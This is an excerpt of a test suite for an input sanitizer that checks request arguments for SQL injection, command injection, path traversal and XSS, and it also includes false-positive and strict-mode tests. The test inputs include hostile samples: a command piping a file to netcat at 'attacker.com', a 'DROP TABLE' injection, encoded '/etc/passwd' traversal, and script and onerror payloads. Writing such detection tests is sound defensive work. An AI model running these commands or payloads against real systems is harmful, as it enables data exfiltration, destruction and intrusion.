...
describe("InputSanitizer", () => {
  ...
  describe("SQL Injection Sanitization", () => {
    test("should sanitize SQL quotes", () => {
      const input = {
        params: { arguments: { query: "SELECT * FROM users WHERE id = '1'" } },
      };
    ...
    test("should sanitize SQL comments (--)", () => {
      const input = {
        params: { arguments: { query: "SELECT * FROM users -- comment" } },
      };
      const result = sanitizer.inspectRequest(input);
    ...
    test("should sanitize SQL block comments (/* */)", () => {
      const input = {
        params: { arguments: { query: "SELECT /* comment */ * FROM users" } },
      };
      const result = sanitizer.inspectRequest(input);
    ...
    test("should sanitize UNION-based SQL injection", () => {
      const input = {
        params: { arguments: { query: "1' UNION SELECT * FROM users--" } },
      };
      const result = sanitizer.inspectRequest(input);
  ...
  describe("Command Injection Sanitization", () => {
    ...
    test("should sanitize shell pipes", () => {
      const input = {
        params: { arguments: { cmd: "cat file.txt | nc attacker.com 1234" } },
      };
      const result = sanitizer.inspectRequest(input);
  ...
  describe("Path Traversal Sanitization", () => {
    ...
    test("should sanitize URL-encoded ../ (%2e%2e%2f)", () => {
      const input = {
        params: { arguments: { path: "%2e%2e%2fetc%2fpasswd" } },
      };
      const result = sanitizer.inspectRequest(input);
    ...
    test("should sanitize URL-encoded ..\\ (%2e%2e%5c)", () => {
      const input = {
        params: { arguments: { path: "%2E%2E%5Cwindows%5Csystem32" } },
      };
      const result = sanitizer.inspectRequest(input);
  ...
  describe("XSS Sanitization", () => {
    test("should sanitize <script> tags", () => {
      const input = {
        params: { arguments: { content: '<script>alert("XSS")</script>' } },
      };
      const result = sanitizer.inspectRequest(input);
    ...
    test("should sanitize <iframe> tags", () => {
      const input = {
        params: { arguments: { content: '<iframe src="evil.com"></iframe>' } },
      };
      const result = sanitizer.inspectRequest(input);
    ...
    test("should sanitize event handlers (onclick, onerror, etc.)", () => {
      const input = {
        params: { arguments: { html: "<img src=x onerror=alert(1)>" } },
      };
      const result = sanitizer.inspectRequest(input);
    ...
    test("should sanitize various event handlers", () => {
      const input = {
        params: { arguments: { html: '<div onclick="evil()">Click</div>' } },
      };
      const result = sanitizer.inspectRequest(input);
  ...
  describe("Edge Cases", () => {
    ...
    test("should handle nested objects with malicious content", () => {
      ...
      expect(result.action).toBe("modify");
      const modifiedArgs = (result.modifiedMessage as any).params.arguments;
      expect(JSON.stringify(modifiedArgs).toLowerCase()).not.toContain(
        "<script",
      );
    });
  ...
  describe("False Positive Tests", () => {
    test("should allow legitimate semicolons in prose", () => {
      const input = {
        params: { arguments: { text: "Hello; this is normal text." } },
      };
      const result = sanitizer.inspectRequest(input);
    ...
    test("should allow legitimate quotes in text", () => {
      const input = {
        params: { arguments: { text: "He said 'hello' to me." } },
      };
      const result = sanitizer.inspectRequest(input);
  ...
  describe("Strict Mode", () => {
    ...
    test("should block requests with SQL injection in strict mode", () => {
      const input = {
        params: { arguments: { query: "'; DROP TABLE users; --" } },
      };
      const result = sanitizer.inspectRequest(input);
    ...
    test("should block requests with XSS in strict mode", () => {
      const input = {
        params: { arguments: { html: "<script>alert(1)</script>" } },
      };
      const result = sanitizer.inspectRequest(input);
